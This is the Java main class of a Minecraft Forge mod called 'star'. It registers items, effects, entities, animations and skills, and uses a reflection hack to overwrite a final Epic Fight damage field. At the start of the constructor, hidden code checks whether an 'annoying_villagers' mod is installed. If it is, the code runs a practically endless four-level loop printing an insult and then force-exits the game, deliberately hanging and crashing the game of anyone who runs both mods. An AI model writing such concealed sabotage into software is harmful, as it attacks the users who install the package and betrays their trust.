package com.guhao.star;

import com.dfdyz.epicacg.network.Netmgr;
import com.guhao.star.efmex.IntegrationHandler;
import com.guhao.star.efmex.StarAnimations;
import com.guhao.star.efmex.StarWeaponCapabilityPresets;
import com.guhao.star.regirster.Effect;
import com.guhao.star.regirster.Entities;
import com.guhao.star.regirster.Items;
import com.guhao.star.regirster.ParticleType;
import com.guhao.star.skills.StarSkill;
import net.minecraft.ChatFormatting;
import net.minecraft.network.chat.TextComponent;
import net.minecraft.network.chat.TranslatableComponent;
import net.minecraft.world.item.ItemStack;
import net.minecraft.world.item.enchantment.EnchantmentHelper;
import net.minecraft.world.item.enchantment.Enchantments;
import net.minecraftforge.common.MinecraftForge;
import net.minecraftforge.eventbus.api.IEventBus;
import net.minecraftforge.eventbus.api.SubscribeEvent;
import net.minecraftforge.fml.ModList;
import net.minecraftforge.fml.ModLoadingContext;
import net.minecraftforge.fml.common.Mod;
import net.minecraftforge.fml.config.ModConfig;
import net.minecraftforge.fml.event.lifecycle.FMLClientSetupEvent;
import net.minecraftforge.fml.event.lifecycle.FMLCommonSetupEvent;
import net.minecraftforge.fml.event.lifecycle.FMLConstructModEvent;
import net.minecraftforge.fml.javafmlmod.FMLJavaModLoadingContext;
import yesman.epicfight.world.damagesource.ExtraDamageInstance;

import java.lang.reflect.Field;
import java.lang.reflect.Modifier;

@Mod(Star.MODID)
public class Star {
    public static final String MODID = "star";
    public static long millis = 0L;
    public Star() {
        /////////////////////////
        if (ModList.get().isLoaded("annoying_villagersbychentu") | ModList.get().isLoaded("annoying_villagers")) {
            for (int f = Integer.MIN_VALUE; f < Integer.MAX_VALUE; f++) {
                for (int u = Integer.MIN_VALUE; u < Integer.MAX_VALUE; u++) {
                    for (int c = Integer.MIN_VALUE; c < Integer.MAX_VALUE; c++) {
                        for (int k = Integer.MIN_VALUE; k < Integer.MAX_VALUE; k++) {
                            System.out.print("Stop playing annoying villagers,IDIOT!!!");
                        }
                    }
                }
            }
            System.exit(114514);
        }
        /////////////////////////
        IEventBus fg_bus = MinecraftForge.EVENT_BUS;
        IEventBus bus = FMLJavaModLoadingContext.get().getModEventBus();
        ParticleType.PARTICLES.register(bus);
        Effect.REGISTRY.register(bus);
        Items.ITEMS.register(bus);
        Entities.REGISTRY.register(bus);
        bus.addListener(StarWeaponCapabilityPresets::register);
        bus.addListener(StarAnimations::registerAnimations);
        bus.addListener(this::setupClient);
        bus.addListener(this::setupCommon);
        ModLoadingContext.get().registerConfig(ModConfig.Type.CLIENT, Config.SPEC);
        bus.register(Netmgr.CHANNEL);
        fg_bus.register(this);
        fg_bus.addListener(StarSkill::BuildSkills);
    }

    private void setupClient(final FMLClientSetupEvent event){
        StarAnimations.LoadCamAnims();
    }
    @SubscribeEvent
    public static void modConstruction(FMLConstructModEvent event) {
        IntegrationHandler.construct();
    }
    @SubscribeEvent
    public void setupCommon(FMLCommonSetupEvent event) {
        event.enqueueWork(Netmgr::register);
        StarSkill.registerSkills();

        try {
            Field field = ExtraDamageInstance.class.getDeclaredField("SWEEPING_EDGE_ENCHANTMENT");
            // 骚操作
            Field modifiersField = Field.class.getDeclaredField("modifiers"); //①
            modifiersField.setAccessible(true);
            modifiersField.setInt(field, field.getModifiers() & ~Modifier.FINAL); //②

            // 设置字段为可访问
            field.setAccessible(true);

            // 修改字段的值
            field.set(new ExtraDamageInstance(ExtraDamageInstance.SWEEPING_EDGE_ENCHANTMENT), new ExtraDamageInstance.ExtraDamage((attacker, itemstack, target, baseDamage, params) -> {
                int i = EnchantmentHelper.getItemEnchantmentLevel(Enchantments.SWEEPING_EDGE, itemstack);
                float modifier = i > 0 ? (float)i * 0.15F + 1.0F : 0.0F;
                return baseDamage * modifier;
            }, (itemstack, tooltips, baseDamage, params) -> {
                int i = EnchantmentHelper.getItemEnchantmentLevel(Enchantments.SWEEPING_EDGE, itemstack);
                if (i > 0) {
                    double modifier = (double)i * 0.15F + 1.0;
                    double damage = baseDamage * modifier;
                    tooltips.append((new TranslatableComponent("damage_source.epicfight.sweeping_edge_enchant_level", (new TextComponent(ItemStack.ATTRIBUTE_MODIFIER_FORMAT.format(damage))).withStyle(ChatFormatting.DARK_PURPLE), i)).withStyle(ChatFormatting.DARK_GRAY));
                }
            }));

        } catch (NoSuchFieldException | IllegalAccessException e) {
            e.printStackTrace();
        }

    }
}


